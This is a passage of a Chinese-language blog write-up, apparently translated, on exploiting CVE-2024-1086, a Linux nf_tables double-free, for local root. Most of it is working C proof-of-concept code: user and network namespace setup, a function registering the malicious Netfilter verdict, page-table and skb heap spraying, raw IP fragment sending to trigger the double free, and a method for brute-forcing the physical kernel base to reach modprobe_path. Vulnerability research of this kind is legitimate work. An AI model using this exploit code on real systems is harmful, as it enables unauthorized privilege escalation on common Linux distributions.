<p>如果设置了 <code>CONFIG_PHYSICAL_ALIGN</code>，将使用该值作为对齐，而不是 <code>CONFIG_PHYSICAL_START</code>。请注意，<code>CONFIG_PHYSICAL_ALIGN</code> 通常较小，如 <code>0x20&#39;0000</code>，即 2MiB，这意味着需要暴力破解更多地址（比使用 <code>0x100&#39;0000</code> 对齐的情况多 8 倍）。</p>
</blockquote>
<p>假设目标设备有 8GiB 的物理内存，这意味着我们可以将搜索范围减少到 <code>8GiB / 16MiB = 512</code> 个可能的物理内核基址，因为我们知道基址必须对齐到 <code>CONFIG_PHYSICAL_START</code> 字节。其优势在于，我们只需检查 512 个地址中每个地址的第一页中的前几个字节，以确定该页是否是内核基址。</p>
<p>我们可以通过暴力破解几百个物理地址来确定物理内核基址。幸运的是，脏页目录允许对整个页面进行无限制的读&#x2F;写，因此允许我们每个物理（页面）地址读取 4096 字节，更幸运的是，每次覆盖 512 个页面地址。这需要我们只覆盖一次 PTE 即可找出物理内核基址（如果机器有 8GiB 内存）。</p>
<p>为了正确识别这 512 个物理地址中哪个包含内核基址，我编写了 <code>get-sig</code>：一些 Python 脚本生成了一个巨大的 <code>memcmp</code> 驱动的 <code>if</code> 语句，用来查找不同内核转储之间的重叠字节。</p>
<h3 id="4-8-2-获取目标物理地址"><a href="#4-8-2-获取目标物理地址" class="headerlink" title="4.8.2 获取目标物理地址"></a>4.8.2 获取目标物理地址</h3><p>当我们找到物理基址后，如果目标的读&#x2F;写操作驻留在内核区域内，我们可以使用基于物理内核基址的硬编码偏移来找到目标物理地址，或者通过在 80MiB 的物理内核内存区域中扫描目标数据的模式来确定地址。</p>
<p>数据扫描技术需要 <code>1 + 80MiB/2MiB ≈ 40</code> 个 PTE 覆盖（假设系统有 8GiB 内存）。如果我们能使用脏页目录，且目标数据的格式是唯一的（例如 <code>modprobe_path</code> 的缓冲区），则数据模式扫描方法由于在不同内核版本之间具有更广泛的兼容性，因此是更好的方法，特别是当我们在编译漏洞利用时不知道偏移时。</p>
<p>请注意，内存扫描技术中的 <code>80MiB</code> 是一个估算值，实际可能更少，甚至可以优化为更小的内存区域，因为某些目标可能驻留在某些区域，这些区域具有特定的偏移。例如，内核代码可能出现在基址的偏移 <code>+0x0</code> 处，而内核数据可能始终从基址的 <code>+0x1000000</code> 开始，无论使用哪个内核，因为内核大小保持相对一致。因此，如果我们正在搜索 <code>modprobe_path</code>，我们可以从 <code>+0x1000000</code> 开始，但这还没有经过测试。</p>
<h1 id="5-概念验证"><a href="#5-概念验证" class="headerlink" title="5. 概念验证"></a>5. 概念验证</h1><h2 id="5-1-执行"><a href="#5-1-执行" class="headerlink" title="5.1 执行"></a>5.1 执行</h2><p>让我们攻破主机系统吧，可以吗？漏洞利用的一般轮廓可以从下图中推导出来。在本节中，我会尝试将各小节与该图进行关联，以便更清晰地理解。</p>
<blockquote>
<p>注意，本节中的漏洞利用指的是新版本，而不是原始的 KernelCTF 缓解措施漏洞利用（新版本同样适用于缓解实例）。相关的详细写作会在 KernelCTF 仓库中单独发布。<br>请随意阅读漏洞利用的源代码，可以在我的 <strong>CVE-2024-1086</strong> 概念验证（PoC）仓库中找到。</p>
</blockquote>
<p><strong>插图 5.1.1</strong>：鸟瞰视角展示漏洞利用的各个阶段。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/12/CVE-2024-1086/images/gameplanv2-5.svg"
                     
                ></p>
<h3 id="5-1-1-设置环境"><a href="#5-1-1-设置环境" class="headerlink" title="5.1.1 设置环境"></a>5.1.1 设置环境</h3><p>为了触发漏洞，我们需要设置一个特定的网络环境和用户名命名空间。</p>
<h4 id="5-1-1-1-命名空间"><a href="#5-1-1-1-命名空间" class="headerlink" title="5.1.1.1 命名空间"></a>5.1.1.1 命名空间</h4><p>对于本地权限提升（LPE）漏洞利用，我们需要启用非特权用户命名空间选项来访问 <strong>nf_tables</strong>。在像 Debian 和 Ubuntu 这样的大型发行版中，这个选项默认是启用的。因此，这些发行版比那些不允许非特权用户名命名空间的发行版具有更大的攻击面。这可以通过 <code>sysctl kernel.unprivileged_userns_clone</code> 来检查，值为 <code>1</code> 表示已启用：</p>
<p><strong>代码块 5.1.1.1.1</strong>：用于检查是否启用了非特权用户命名空间的命令行。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sysctl kernel.unprivileged_userns_clone</span><br><span class="line">kernel.unprivileged_userns_clone = 1</span><br></pre></td></tr></table></figure></div>
<p>在漏洞利用中，我们使用以下代码来创建所需的用户和网络命名空间：</p>
<p><strong>代码块 5.1.1.1.2</strong>：漏洞利用的 <code>do_unshare()</code> 函数，使用 C 编写，用于创建用户和网络命名空间。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">do_unshare</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> retv;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] creating user namespace (CLONE_NEWUSER)...\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 单独执行 unshare 以便调试更容易</span></span><br><span class="line">    retv = unshare(CLONE_NEWUSER);</span><br><span class="line">    <span class="keyword">if</span> (retv == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;unshare(CLONE_NEWUSER)&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] creating network namespace (CLONE_NEWNET)...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    retv = unshare(CLONE_NEWNET);</span><br><span class="line">    <span class="keyword">if</span> (retv == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;unshare(CLONE_NEWNET)&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>随后，我们通过设置 UID&#x2F;GID 映射来获得命名空间的 root 访问权限：</p>
<p><strong>代码块 5.1.1.1.3</strong>：漏洞利用的 <code>configure_uid_map()</code> 函数，使用 C 编写，用于设置用户和组映射。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">configure_uid_map</span><span class="params">(<span class="type">uid_t</span> old_uid, <span class="type">gid_t</span> old_gid)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> uid_map[<span class="number">128</span>];</span><br><span class="line">    <span class="type">char</span> gid_map[<span class="number">128</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] setting up UID namespace...\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">sprintf</span>(uid_map, <span class="string">&quot;0 %d 1\n&quot;</span>, old_uid); </span><br><span class="line">    <span class="built_in">sprintf</span>(gid_map, <span class="string">&quot;0 %d 1\n&quot;</span>, old_gid);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 写入 UID/GID 映射。将 setgroups 设置为 &quot;deny&quot; 以避免权限错误</span></span><br><span class="line">    PRINTF_VERBOSE(<span class="string">&quot;[*] mapping uid %d to namespace uid 0...\n&quot;</span>, old_uid);</span><br><span class="line">    write_file(<span class="string">&quot;/proc/self/uid_map&quot;</span>, uid_map, <span class="built_in">strlen</span>(uid_map), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    PRINTF_VERBOSE(<span class="string">&quot;[*] denying namespace rights to set user groups...\n&quot;</span>);</span><br><span class="line">    write_file(<span class="string">&quot;/proc/self/setgroups&quot;</span>, <span class="string">&quot;deny&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;deny&quot;</span>), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    PRINTF_VERBOSE(<span class="string">&quot;[*] mapping gid %d to namespace gid 0...\n&quot;</span>, old_gid);</span><br><span class="line">    write_file(<span class="string">&quot;/proc/self/gid_map&quot;</span>, gid_map, <span class="built_in">strlen</span>(gid_map), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> CONFIG_VERBOSE_</span></span><br><span class="line">    <span class="comment">// 执行合理性检查</span></span><br><span class="line">    <span class="comment">// 仅用于调试，因为可能对用户造成困惑</span></span><br><span class="line">    system(<span class="string">&quot;id&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h4 id="5-1-1-2-Nftables"><a href="#5-1-1-2-Nftables" class="headerlink" title="5.1.1.2 Nftables"></a>5.1.1.2 Nftables</h4><p>为了触发漏洞，我们需要设置具有恶意判决的钩子&#x2F;规则。为了避免内容杂乱，我不会在这里显示完整的代码，大家可以随意查看 Github 仓库。不过，我使用以下函数来设置精确的判决值。</p>
<p><strong>代码块 5.1.1.2.1</strong>：漏洞利用的 <code>add_set_verdict()</code> 函数，使用 C 编写，用于注册导致漏洞的恶意 Netfilter 判决。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将规则判决设置为任意值</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">add_set_verdict</span><span class="params">(<span class="keyword">struct</span> nftnl_rule *r, <span class="type">uint32_t</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nftnl_expr</span> *<span class="title">e</span>;</span></span><br><span class="line"></span><br><span class="line">    e = nftnl_expr_alloc(<span class="string">&quot;immediate&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (e == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;expr immediate&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    nftnl_expr_set_u32(e, NFTNL_EXPR_IMM_DREG, NFT_REG_VERDICT);</span><br><span class="line">    nftnl_expr_set_u32(e, NFTNL_EXPR_IMM_VERDICT, val);</span><br><span class="line"></span><br><span class="line">    nftnl_rule_add_expr(r, e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h4 id="5-1-1-3-预分配"><a href="#5-1-1-3-预分配" class="headerlink" title="5.1.1.3 预分配"></a>5.1.1.3 预分配</h4><p>在开始程序的实际漏洞利用部分之前，我们需要预先分配一些对象，以防止分配器噪音的干扰，因为在漏洞利用的某些敏感区域，如果有过多的噪音，可能会导致失败。这并不复杂，更多是一种琐碎的工作，而不是技术上的魔法。</p>
<p>注意 <strong>CONFIG_SEC_BEFORE_STORM</strong>，它会等待所有后台分配完成，以防跨 CPU 进行的分配。这显著降低了漏洞利用的速度（1 秒 -&gt; 11 秒），但在系统上存在大量后台噪音的情况下，极大地提高了漏洞利用的稳定性。有趣的是，在几乎没有工作负载的系统（如 KernelCTF 镜像）上，不使用 <code>sleep</code> 成功率从 93% 提升到 99.4%（n&#x3D;1000），所以可以根据需要自行调整这个值。</p>
<p><strong>代码块5.1.1.3.1</strong>：C 编写的部分漏洞利用代码，用于预先分配对象以减少内核页面分配器的噪音。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">privesc_flh_bypass_no_time</span><span class="params">(<span class="type">int</span> shell_stdin_fd, <span class="type">int</span> shell_stdout_fd)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *pte_area;</span><br><span class="line">    <span class="type">void</span> *_pmd_area;</span><br><span class="line">    <span class="type">void</span> *pmd_kernel_area;</span><br><span class="line">    <span class="type">void</span> *pmd_data_area;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ip</span> <span class="title">df_ip_header</span> =</span> &#123;</span><br><span class="line">        .ip_v = <span class="number">4</span>,</span><br><span class="line">        .ip_hl = <span class="number">5</span>,</span><br><span class="line">        .ip_tos = <span class="number">0</span>,</span><br><span class="line">        .ip_len = <span class="number">0xDEAD</span>,</span><br><span class="line">        .ip_id = <span class="number">0xDEAD</span>, </span><br><span class="line">        .ip_off = <span class="number">0xDEAD</span>,</span><br><span class="line">        .ip_ttl = <span class="number">128</span>,</span><br><span class="line">        .ip_p = <span class="number">70</span>,</span><br><span class="line">        .ip_src.s_addr = inet_addr(<span class="string">&quot;1.1.1.1&quot;</span>),</span><br><span class="line">        .ip_dst.s_addr = inet_addr(<span class="string">&quot;255.255.255.255&quot;</span>),</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">char</span> modprobe_path[KMOD_PATH_LEN] = &#123; <span class="string">&#x27;\x00&#x27;</span> &#125;;</span><br><span class="line"></span><br><span class="line">    get_modprobe_path(modprobe_path, KMOD_PATH_LEN);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] running normal privesc\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    PRINTF_VERBOSE(<span class="string">&quot;[*] doing first useless allocs to setup caching and stuff...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    pin_cpu(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 为 PMD 分配 PUD（和 PMD+PTE）</span></span><br><span class="line">    mmap((<span class="type">void</span>*)PTI_TO_VIRT(<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>), <span class="number">0x2000</span>, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)PTI_TO_VIRT(<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) = <span class="number">0xDEADBEEF</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 预注册喷射的 PTE，每个为 0x1000 * 2，因此 2 个 PTE 在与 PMD 重叠时适配</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> i = <span class="number">0</span>; i &lt; CONFIG_PTE_SPRAY_AMOUNT; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">void</span> *retv = mmap((<span class="type">void</span>*)PTI_TO_VIRT(<span class="number">2</span>, <span class="number">0</span>, i, <span class="number">0</span>, <span class="number">0</span>), <span class="number">0x2000</span>, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (retv == MAP_FAILED)</span><br><span class="line">        &#123;</span><br><span class="line">            perror(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 为喷射的 PTE 预分配 PMD</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> i = <span class="number">0</span>; i &lt; CONFIG_PTE_SPRAY_AMOUNT / <span class="number">512</span>; i++)</span><br><span class="line">        *(<span class="type">char</span>*)PTI_TO_VIRT(<span class="number">2</span>, i, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) = <span class="number">0x41</span>;</span><br><span class="line">    </span><br><span class="line">    _pmd_area = mmap((<span class="type">void</span>*)PTI_TO_VIRT(<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>), <span class="number">0x400000</span>, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    pmd_kernel_area = _pmd_area;</span><br><span class="line">    pmd_data_area = _pmd_area + <span class="number">0x200000</span>;</span><br><span class="line"></span><br><span class="line">    PRINTF_VERBOSE(<span class="string">&quot;[*] allocated VMAs for process:\n  - pte_area: ?\n  - _pmd_area: %p\n  - modprobe_path: &#x27;%s&#x27; @ %p\n&quot;</span>, _pmd_area, modprobe_path, modprobe_path);</span><br><span class="line"></span><br><span class="line">    populate_sockets();</span><br><span class="line"></span><br><span class="line">    set_ipfrag_time(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    df_ip_header.ip_id = <span class="number">0x1336</span>;</span><br><span class="line">    df_ip_header.ip_len = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> ip) * <span class="number">2</span> + <span class="number">32768</span> + <span class="number">8</span> + <span class="number">4000</span>;</span><br><span class="line">    df_ip_header.ip_off = ntohs((<span class="number">8</span> &gt;&gt; <span class="number">3</span>) | <span class="number">0x2000</span>);</span><br><span class="line">    alloc_intermed_buf_hdr(<span class="number">32768</span> + <span class="number">8</span>, &amp;df_ip_header);</span><br><span class="line"></span><br><span class="line">    set_ipfrag_time(<span class="number">9999</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] waiting for the calm before the storm...\n&quot;</span>);</span><br><span class="line">    sleep(CONFIG_SEC_BEFORE_STORM);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ... (漏洞的剩余部分)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="5-1-2-执行双重释放"><a href="#5-1-2-执行双重释放" class="headerlink" title="5.1.2 执行双重释放"></a>5.1.2 执行双重释放</h3><p>执行双重释放是漏洞利用中最棘手的部分，因为我们需要利用 IPv4 网络代码和页面分配器。在本节中，我们将进行双重释放，以便在下一节中使用 <strong>Dirty Page Directory</strong> 获得对任何物理内存页的任意读写，这反而变得相对容易。</p>
<h4 id="5-1-2-1-保留用于掩盖的干净-skb"><a href="#5-1-2-1-保留用于掩盖的干净-skb" class="headerlink" title="5.1.2.1 保留用于掩盖的干净 skb"></a>5.1.2.1 保留用于掩盖的干净 skb</h4><p>为了在双重释放之前分配 <code>skb</code>（在双重释放中间释放以避免检测并确保稳定），漏洞利用向自身的 UDP 监听套接字发送 UDP 数据包。在 UDP 监听器通过 <code>recv()</code> 函数接收这些数据包之前，它们会作为单独的 <code>skb</code> 保留在内存中。</p>
<p><strong>代码块 5.1.2.1.1</strong>：漏洞利用的 <code>send_ipv4_udp()</code> 函数，使用 C 编写，用于抽象网络数据的发送。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">send_ipv4_udp</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* buf, <span class="type">size_t</span> buflen)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">dst_addr</span> =</span> &#123;</span><br><span class="line">        .sin_family = AF_INET,</span><br><span class="line">        .sin_port = htons(<span class="number">45173</span>),</span><br><span class="line">        .sin_addr.s_addr = inet_addr(<span class="string">&quot;127.0.0.1&quot;</span>)</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    sendto_noconn(&amp;dst_addr, buf, buflen, sendto_ipv4_udp_client_sockfd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><strong>代码块 5.1.2.1.2</strong>：部分漏洞利用代码，使用 C 编写，分配 UDP 数据包以喷射 <code>sk_buff</code> 对象，以便后续自由使用。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">alloc_ipv4_udp</span><span class="params">(<span class="type">size_t</span> content_size)</span></span><br><span class="line">&#123;</span><br><span class="line">    PRINTF_VERBOSE(<span class="string">&quot;[*] sending udp packet...\n&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(intermed_buf, <span class="string">&#x27;\x00&#x27;</span>, content_size);</span><br><span class="line">    send_ipv4_udp(intermed_buf, content_size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">privesc_flh_bypass_no_time</span><span class="params">(<span class="type">int</span> shell_stdin_fd, <span class="type">int</span> shell_stdout_fd)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ...（设置代码）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从 skb 空闲列表中弹出 N 个 skb</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; CONFIG_SKB_SPRAY_AMOUNT; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        PRINTF_VERBOSE(<span class="string">&quot;[*] reserving udp packets... (%d/%d)\n&quot;</span>, i, CONFIG_SKB_SPRAY_AMOUNT);</span><br><span class="line">        alloc_ipv4_udp(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...（漏洞的剩余部分）</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h4 id="5-1-2-2-触发双重释放的第一次释放"><a href="#5-1-2-2-触发双重释放的第一次释放" class="headerlink" title="5.1.2.2 触发双重释放的第一次释放"></a>5.1.2.2 触发双重释放的第一次释放</h4><p>为了触发双重释放，我发送了一个 IP 数据包，它会触发我们之前设置的 nftables 规则。这里选择了任意协议（不包括 TCP 和 UDP），因为如果使用 TCP 或 UDP 数据包，它们会被传递到 TCP&#x2F;UDP 处理器代码，而这些代码会因为数据损坏而导致内核崩溃。</p>
<p>请注意，IP 头中的偏移字段使用了 <strong>IP_MF</strong> 标志（<code>0x2000</code>），我们利用它将 <code>skb</code> 强制放入 IP 碎片队列，稍后通过发送“完成”的碎片来释放该 <code>skb</code>。另外还需要注意的是，这个 <code>skb</code> 的大小决定了双重释放的对象大小。如果我们分配一个内容为 0 字节的数据包，分配的 <code>skb</code> 头对象将位于 <strong>kmalloc-256</strong>（因为元数据的原因），而如果我们分配一个 32768 字节的数据包，它将在 <strong>order 4</strong>（来自伙伴分配器的 16 页内存块）中。</p>
<p><strong>代码块 5.1.2.2.1</strong>：漏洞利用函数 <code>send_ipv4_ip_hdr()</code> 使用 C 编写，用于抽象校验和和套接字代码以发送原始 IP 数据包。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">char</span> intermed_buf[<span class="number">1</span> &lt;&lt; <span class="number">19</span>]; <span class="comment">// 简单地预分配中间缓冲区</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> sendto_ipv4_ip_sockfd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">send_ipv4_ip_hdr</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* buf, <span class="type">size_t</span> buflen, <span class="keyword">struct</span> ip *ip_header)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> ip_buflen = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> ip) + buflen;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">dst_addr</span> =</span> &#123;</span><br><span class="line">        .sin_family = AF_INET,</span><br><span class="line">        .sin_addr.s_addr =  inet_addr(<span class="string">&quot;127.0.0.2&quot;</span>)  <span class="comment">// 127.0.0.1 不会触发 ipfrag_time，不能设置为 1.1.1.1 因为 C 运行时可能会捕捉到它</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(intermed_buf, ip_header, <span class="keyword">sizeof</span>(*ip_header));</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;intermed_buf[<span class="keyword">sizeof</span>(*ip_header)], buf, buflen);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 校验和需要先设为 0</span></span><br><span class="line">    ((<span class="keyword">struct</span> ip*)intermed_buf)-&gt;ip_sum = <span class="number">0</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> ip*)intermed_buf)-&gt;ip_sum = ip_finish_sum(ip_checksum(intermed_buf, ip_buflen, <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">    PRINTF_VERBOSE(<span class="string">&quot;[*] sending IP packet (%ld bytes)...\n&quot;</span>, ip_buflen);</span><br><span class="line"></span><br><span class="line">    sendto_noconn(&amp;dst_addr, intermed_buf, ip_buflen, sendto_ipv4_ip_sockfd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><strong>代码块 5.1.2.2.2</strong>：部分漏洞利用代码，使用 C 编写，发送原始 IP 数据包并触发我们之前设置的 nftables 规则。</p>
